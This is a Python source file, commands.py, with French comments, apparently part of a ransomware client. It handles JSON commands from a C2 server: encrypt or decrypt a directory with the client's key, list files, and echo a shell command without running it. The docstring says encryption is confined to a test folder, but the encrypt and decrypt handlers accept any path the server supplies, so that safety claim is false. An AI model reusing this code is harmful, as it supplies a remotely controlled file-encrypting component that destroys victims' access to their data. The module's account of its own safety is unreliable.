"""
commands.py
-----------

Module chargé de traiter les commandes envoyées par le serveur C2.

Ce fichier est volontairement pédagogique :
- aucune action dangereuse n'est exécutée
- les commandes sont traitées proprement
- les opérations sensibles (encrypt/decrypt réels) sont limitées
  à un dossier de test pour éviter tout risque

Chaque commande renvoie une réponse JSON au serveur.
"""

from typing import Dict, Any
from pathlib import Path
from system import encrypt_directory, decrypt_directory
import os


def handle_command(command: Dict[str, Any], key: str) -> Dict[str, Any]:
    """
    Fonction principale de dispatch des commandes.

    Paramètres :
        command : dict JSON reçu depuis le serveur
        key     : clé de chiffrement générée par le client

    Retour :
        Un dictionnaire représentant la réponse à renvoyer au serveur.
    """

    ctype = command.get("type")

    if not ctype:
        return {"error": "Commande sans type"}

    # ------------------------------------------------------------
    # 1) Commande 'cmd' (version pédagogique, non exécutée)
    # ------------------------------------------------------------
    if ctype == "cmd":
        cmd = command.get("command", "")
        return {
            "type": "cmd_result",
            "output": f"Commande reçue (non exécutée) : {cmd}"
        }

    # ------------------------------------------------------------
    # 2) Commande 'encrypt' (sur un dossier test uniquement)
    # ------------------------------------------------------------
    if ctype == "encrypt":
        target = command.get("path", str(Path.home() / "ransomware_test"))
        encrypt_directory(Path(target), key)
        return {
            "type": "encrypt_result",
            "status": "ok",
            "path": target
        }

    # ------------------------------------------------------------
    # 3) Commande 'decrypt' (sur un dossier test uniquement)
    # ------------------------------------------------------------
    if ctype == "decrypt":
        target = command.get("path", str(Path.home() / "ransomware_test"))
        decrypt_directory(Path(target), key)
        return {
            "type": "decrypt_result",
            "status": "ok",
            "path": target
        }

    # ------------------------------------------------------------
    # 4) Commande pédagogique : ls
    # ------------------------------------------------------------
    if ctype == "ls":
        try:
            files = os.listdir(".")
            return {
                "type": "ls_result",
                "files": files
            }
        except Exception as e:
            return {
                "type": "ls_result",
                "error": str(e)
            }

    # ------------------------------------------------------------
    # 5) Commande inconnue
    # ------------------------------------------------------------
    return {"error": f"Commande inconnue : {ctype}"}
